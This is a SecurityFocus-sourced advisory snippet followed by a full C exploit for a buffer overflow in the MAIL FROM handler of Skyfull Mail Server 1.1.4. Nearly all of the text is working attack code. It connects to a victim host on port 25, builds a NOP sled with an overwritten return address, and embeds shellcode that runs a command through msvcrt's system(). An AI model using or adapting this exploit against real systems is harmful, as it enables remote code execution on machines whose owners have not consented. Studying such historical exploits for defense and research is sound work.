source: http://www.securityfocus.com/bid/759/info

The Skyfull mail server version 1.1.4 has an unchecked buffer into which the argument from the MAIL FROM command is placed. This buffer can be overwritten and arbitrary code can be executed.

/*=============================================================================
   Skyfull Mail Server Version 1.1.4 Exploit
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =============================================================================
*/

#include    <stdio.h>
#include    <string.h>
#include    <windows.h>
#include    <winsock.h>

#define     MAXBUF          3000
#define     RETADR          655
#define     JMPADR          651
#define     SMTP_PORT       25
#define     JMPEAX_ADR      0xbfe0a035

unsigned char exploit_code[200]={
0xEB,0x32,0x5B,0x53,0x32,0xE4,0x83,0xC3,
0x0B,0x4B,0x88,0x23,0xB8,0x50,0x77,0xF7,
0xBF,0xFF,0xD0,0x43,0x53,0x50,0x32,0xE4,
0x83,0xC3,0x06,0x88,0x23,0xB8,0x28,0x6E,
0xF7,0xBF,0xFF,0xD0,0x8B,0xF0,0x43,0x53,
0x83,0xC3,0x0B,0x32,0xE4,0x88,0x23,0xFF,
0xD6,0x90,0xEB,0xFD,0xE8,0xC9,0xFF,0xFF,
0xFF,0x00
};
unsigned char cmdbuf[200]="msvcrt.dll.system.welcome.exe";

main(int argc,char *argv[])
{
    SOCKET               sock;
    SOCKADDR_IN          addr;
    WSADATA              wsa;
    WORD                 wVersionRequested;
    unsigned int         ip,p1,p2;
    static unsigned char buf[MAXBUF],packetbuf[MAXBUF+1000];
    struct hostent       *hs;

    if (argc<2){
        printf("usage: %s VictimHost\n",argv[0]); return -1;
    }
    wVersionRequested = MAKEWORD( 2, 0 );
    if (WSAStartup(wVersionRequested , &wsa)!=0){
        printf("Winsock Initialization failed.\n"); return -1;
    }
    if ((sock=socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET){
        printf("Can not create socket.\n"); return -1;
    }
    addr.sin_family     = AF_INET;
    addr.sin_port       = htons((u_short)SMTP_PORT);
    if ((addr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
            if ((hs=gethostbyname(argv[1]))==NULL){
                printf("Can not resolve specified host.\n"); return -1;
            }
            addr.sin_family = hs->h_addrtype;
            memcpy((void *)&addr.sin_addr.s_addr,hs->h_addr,hs->h_length);
    }
    if (connect(sock,(LPSOCKADDR)&addr,sizeof(addr))==SOCKET_ERROR){
        printf("Can not connect to specified host.\n"); return -1;
    }
    recv(sock,packetbuf,MAXBUF,0);
    printf("BANNER FROM \"%s\" : %s\n",argv[1],packetbuf);

    memset(buf,0x90,MAXBUF); buf[MAXBUF]=0;
    ip=JMPEAX_ADR;
    buf[RETADR  ]=ip&0xff;
    buf[RETADR+1]=(ip>>8)&0xff;
    buf[RETADR+2]=(ip>>16)&0xff;
    buf[RETADR+3]=(ip>>24)&0xff;
    buf[JMPADR  ]=0xeb;
    buf[JMPADR+1]=0x80;

    strcat(exploit_code,cmdbuf);
    p1=(unsigned int)LoadLibrary;
    p2=(unsigned int)GetProcAddress;
    exploit_code[0x0d]=p1&0xff;
    exploit_code[0x0e]=(p1>>8)&0xff;
    exploit_code[0x0f]=(p1>>16)&0xff;
    exploit_code[0x10]=(p1>>24)&0xff;
    exploit_code[0x1e]=p2&0xff;
    exploit_code[0x1f]=(p2>>8)&0xff;
    exploit_code[0x20]=(p2>>16)&0xff;
    exploit_code[0x21]=(p2>>24)&0xff;
   
memcpy(buf+JMPADR-strlen(exploit_code)-1,exploit_code,strlen(exploit_code));

    sprintf(packetbuf,"HELO UNYUN\n");
    send(sock,packetbuf,strlen(packetbuf),0);
    recv(sock,packetbuf,MAXBUF,0);
    printf("HELO: Reply from \"%s\" : %s\n",argv[1],packetbuf);
    sprintf(packetbuf,"MAIL FROM: UNYUN <%s@shadowpenguin.net>\r\n",buf);
    send(sock,packetbuf,strlen(packetbuf),0);
    closesocket(sock);
    printf("Done.\n");
    return FALSE;
}